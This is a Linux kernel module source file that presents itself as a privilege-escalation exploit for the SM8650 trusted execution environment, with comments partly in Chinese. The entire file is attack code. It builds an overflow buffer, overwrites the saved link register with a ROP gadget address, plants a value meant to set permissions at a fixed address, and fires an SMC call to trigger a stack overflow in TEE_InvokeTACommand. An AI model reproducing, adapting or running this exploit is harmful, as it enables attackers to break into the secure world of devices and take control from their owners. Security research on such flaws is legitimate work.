#include <linux/module.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#define SMC_TEE_INVOKE_TA    0x82000001

#define BUF_SIZE         0x1B8
#define LR_OFFSET        0x318
#define PERM_ADDR        0xD8424354
#define GADGET_SET_PERM  0xD8401AE8

static uint64_t smc_tee_call(uint64_t arg0, uint64_t arg1, uint64_t arg2, uint64_t arg3)
{
    register uint64_t x0 asm("x0") = arg0;
    register uint64_t x1 asm("x1") = arg1;
    register uint64_t x2 asm("x2") = arg2;
    register uint64_t x3 asm("x3") = arg3;

    asm volatile (
        "smc #0\n"
        : "+r"(x0), "+r"(x1), "+r"(x2), "+r"(x3)
        :
        : "memory", "cc"
    );

    return x0;
}

static int __init exp_init(void)
{
    void *payload;
    pr_info("=== SM8650 TEE 提权 EXP loaded ===");

    payload = kzalloc(0x400, GFP_KERNEL);
    if (!payload) return -ENOMEM;

    // 填充到偏移位置
    memset(payload, 0x41, LR_OFFSET);

    // 覆盖 LR → ROP 写入权限
    *(uint64_t *)(payload + LR_OFFSET) = GADGET_SET_PERM;

    // x0 将被设为 0xFFFFFFFF → 写入 PERM_ADDR
    *(uint64_t *)(payload + LR_OFFSET + 8) = 0xFFFFFFFF;

    // 触发 TEE_InvokeTACommand 栈溢出
    pr_info("触发漏洞...");
    smc_tee_call(SMC_TEE_INVOKE_TA, __pa(payload), 0x380, 0);

    pr_info("完成！0x%llx 应该已被设为 0xFFFFFFFF", PERM_ADDR);
    kfree(payload);
    return 0;
}

static void __exit exp_exit(void)
{
    pr_info("EXP unloaded");
}

module_init(exp_init);
module_exit(exp_exit);
MODULE_LICENSE("GPL");
